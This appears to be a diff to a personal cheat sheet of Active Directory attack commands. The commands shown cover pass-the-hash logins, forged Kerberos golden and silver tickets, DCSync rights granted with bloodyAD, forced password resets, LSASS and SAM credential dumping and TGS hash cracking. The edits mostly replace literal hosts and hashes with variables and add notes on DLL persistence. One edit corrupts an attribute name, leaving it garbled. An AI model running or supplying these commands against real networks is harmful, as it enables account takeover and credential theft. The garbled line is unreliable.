@@ -211,6 +211,7 @@ python pywhisker.py -d $dom -u $user -k  -t "winrm_user" --action "add"  --dc-ip
 python /opt/PKINITtools/gettgtpkinit.py $dom/winrm_user -cert-pfx XprBXoPu.pfx -pfx-pass SYBO85IL98n9g0vAfoWm winrm.ccache
 export KRB5CCNAME=winrm.ccache
 evil-winrm -i $dc -r $dom
+evil-winrm -i $ip -u $user -H $hash -s /opt/windows -e /opt/windows
 
 net rpc password $target 'Password123!' -U "$dom"/"$user"%"$pass" -S "$dc"
 
@@ -249,7 +250,7 @@ nxc wmi 10.2.0.2/24 -u jarrieta -H ":16" -x "whoami"
 nxc smb 10.2.0.2/24 -u jarrieta -H ":16" -x "whoami"
 secretsdump.py ituser@10.0.0.40 -hashes aad3b435b51404eeaad3b435b51404ee:16
 # Add users to group, targeted kerberoast
-getTGT.py $dom/$user -dc-ip 10.10.10.1 -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
+getTGT.py $dom/$user -dc-ip $ip -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
 getST.py -hashes :32 -spn www/server01.$dom -dc-ip 10.10.10.1 -impersonate Administrator $dom/$user
 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain $dom -dc-ip 10.10.10.1 -spn cifs/$dom john
 python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain $dom -dc-ip 10.10.10.1 john
@@ -266,7 +267,7 @@ python samrdump.py -hashes 16:16 $dom/Administrator@192.168.1.105
 python reg.py -hashes 16:16 $dom/Administrator@192.168.1.105 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
 python3 smbpasswd.py $dom/administrator@$dom -hashes :<ADMINISTRATOR NT HASH> -reset esteban_da -newhashes :<ESTEBAN_DA NT HASH>
 kerberos::golden /user:raaz /domain:ignite.local /sid:S-1-5-21-1255168540-3690278322-1592948969 /krbtgt:5cced0cb593612f08cf4a0b4f0bcb017 /id:500 /ptt
-bloodyAD --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B set password john.doe 'Password123!' # Using bloodyAD with pass-the-hash to change password, GenericAll/GenericWrite/Owns - User
+bloodyAD --host $dc -d $dom -u $user -p :$hash set password john.doe 'Password123!' # Using bloodyAD with pass-the-hash to change password, GenericAll/GenericWrite/Owns - User
 bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B add dcsync user2 # Give DCSync right to the principal identity, WriteDACL - Domain
 
 
@@ -468,7 +469,7 @@ PowerSploit> Add-DomainObjectAcl -TargetIdentity "INTERESTING_GROUP" -Rights Wri
 
 # WriteDACL - Domain
 # Give DC Sync right, Linux/Windows
-bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B add dcsync user2 # Give DCSync right to the principal identity
+bloodyAD.py --host $ip -d $dom -u $user -p :B4B9B02E6F09A9BD760F388B67351E2B add dcsync user2 # Give DCSync right to the principal identity
 bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p Password123! add dcsync user2 
 bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B remove dcsync user2 # Remove right after DCSync
 # Give DC Sync right, Linux/Windows
@@ -559,7 +560,7 @@ python getnthash.py -key 571d3d9f833365b54bd311a906a63d95da107a8e7457e8ef01b3681
 # WriteProperty over WriteSPN
 SPN-Jacking.py # If the "listed SPN" already belongs to an object, it must be removed from it first. This would require the same privileges (GenericAll, GenericWrite, etc.) over the SPN owner as well (a.k.a. "Live SPN-jacking"). Else, the SPN can be simply be added to the target object (a.k.a. "Ghost SPN-jacking").
 
-# Constrained Delegation (msDS-AllowedToDelegateTo)
+# Constrained Delegation (msds-allowedtodelegatetoeTo)
 # Essentially, if a computer/user object has a userAccountControl value containing TRUSTED_TO_AUTH_FOR_DELEGATION then anyone who compromises that account can impersonate any user to the SPNs set in msds-allowedtodelegateto.
 # Prereqs: SeEnableDelegationPrivilege to modify parameters, uac value TRUSTED_TO_AUTH_FOR_DELEGATION, compromise account, forwardable flag set on TGS-REQ
 Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description # Discovery
@@ -714,6 +715,7 @@ nxc smb 192.168.0.76 -u testadmin -p Password123 -M lsassy
 lsassy -d test.lab -u testadmin -p Password123 192.168.0.76
 /usr/share/$user/kirbi2john.py <KRB5_TGS kirbi>  > <Output file name> # If any TGS are dumped
 john --wordlist=/usr/share/wordlists/rockyou.txt TGS_hash
+# DLL for persistance, check keys
 
 ---
 
@@ -788,6 +790,7 @@ sekurlsa::ekeys
 lsadump::sam
 lsadump::secrets
 lsadump::cache
+# FIND DLLS WITH PROCMON
 
 ---
 
